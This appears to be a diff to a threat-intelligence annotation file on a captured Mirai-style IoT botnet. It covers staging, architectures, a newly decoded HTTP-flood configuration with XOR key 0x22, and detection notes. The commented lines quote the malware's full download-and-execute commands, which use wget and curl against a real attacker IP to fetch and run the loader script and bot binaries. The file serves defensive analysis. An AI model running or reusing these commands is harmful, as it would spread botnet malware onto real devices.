@@ -105,14 +105,60 @@ control.tor2web-relay-fast.onion    # C2 over Tor, see note below
 # Stage 1     : /tmp/.p written directly over telnet (shell-write)
 # Stage 2     : /ohshit.sh, staged in /tmp/ via busybox
 # Staging file: WTF  (payload cat'd into this name, then chmod +x *, then ./WTF)
-# Architectures attempted (16):
+# Architectures attempted (15):
 #   x86 mips arc i468 i686 x86_64 mpsl arm arm5 arm6 arm7 ppc spc m68k sh4
-# Captured 7 of 16 — arm, arm7, sh4, mips, i686, ppc, x86_64
+# Captured 7 of 15 — arm, arm7, sh4, mips, i686, ppc, x86_64
+#   CORRECTED 2026-08-08: earlier revisions said 16. Counted directly from
+#   ohshit.sh — lines 4-18, one fetch line per architecture, 15 lines. The
+#   architecture list itself was always right; only the count was wrong.
+#   8 builds remain uncaptured, not 9.
 # VirusTotal  : no VT record for any sample in this family at capture time
 #               (sidecar scan is null — this is absence of data, NOT a clean verdict)
 
+# [OBFUSCATED CONFIG — XOR 0x22 — added 2026-08-08]
+# All 7 ELF payloads carry a single-byte-XOR obfuscated region, key 0x22.
+# That is Mirai's table.c scheme: config is XORed with the four bytes of
+# TABLE_KEY, and the leaked-source default 0xdeadbeef collapses to one
+# effective byte (0xef ^ 0xbe ^ 0xad ^ 0xde == 0x22).
+#
+# Plaintext string extraction cannot see this region. It was missed until a
+# dedicated XOR sweep was run. Recovered contents:
+#
+#   HTTP scaffolding : "HTTP/1.1", "User-Agent:", "Accept:",
+#                      "Accept-Language:", "Accept-Encoding:", "Referer:"
+#   User-Agent pool  : large rotating list — MSIE 8/9/10, Trident 4/5/6,
+#                      Firefox/Gecko builds
+#   Referer pool     : 20 URLs of real, legitimate sites
+#   UA source        : http://www.useragentstring.com/Firefox25.0_id_19710.php
+#
+# CAPABILITY FINDING: this is a Layer-7 HTTP flood module with User-Agent
+# and Referer randomisation. This family is a DDoS platform, not merely a
+# loader. Not previously documented.
+#
+# *** NO C2 IS HIDDEN IN THE XOR REGION ***
+# Verified across all 7 builds. Every IP-shaped string recovered is a
+# version-number fragment (rv:1.9.0.8, .NET CLR ...) or a network address,
+# and every domain recovered is a legitimate Referer target. The blocklist
+# is unaffected by this finding — which independently confirms it complete.
+#
+# *** DO NOT BLOCKLIST THE RECOVERED REFERER DOMAINS ***
+#   www.google.com  www.facebook.com  twitter.com  www.instagram.com
+#   www.reddit.com  www.youtube.com   www.bing.com  www.linkedin.com
+#   t.co  duckduckgo.com  search.yahoo.com  www.tiktok.com
+#   www.pinterest.com  www.baidu.com  www.cloudflare.com  github.com
+#   stackoverflow.com  news.ycombinator.com  discord.com  telegram.org
+#   www.useragentstring.com
+# These are flood Referer VALUES, not infrastructure. An automated
+# "extract domains from malware -> blocklist" pipeline would ingest them
+# and remove the estate's access to most of the internet. This is the most
+# damaging mistake available anywhere in this capture.
+#
+# Detection: YARA $x1-$x4 use the xor(0x22) modifier; Suricata 9001011 and
+# 9001012 cover the flood traffic (both thresholded — a single flood request
+# is by design indistinguishable from a browser).
+
 # [FULL STAGE-1 CONTENT]
-# wget -q http://94.154.43.123/ohshit.sh -O ohshit.sh 2>/dev/null; sh ohshit.sh; rm -rf ohshit.sh
+# cd /tmp; wget -q http://94.154.43.123/ohshit.sh -O ohshit.sh 2>/dev/null; sh ohshit.sh; rm -rf ohshit.sh
 
 # [STAGE-2 LOOP BODY, per architecture]
 # wget http://94.154.43.123//bot.<arch>; curl -O http://94.154.43.123//bot.<arch>;\
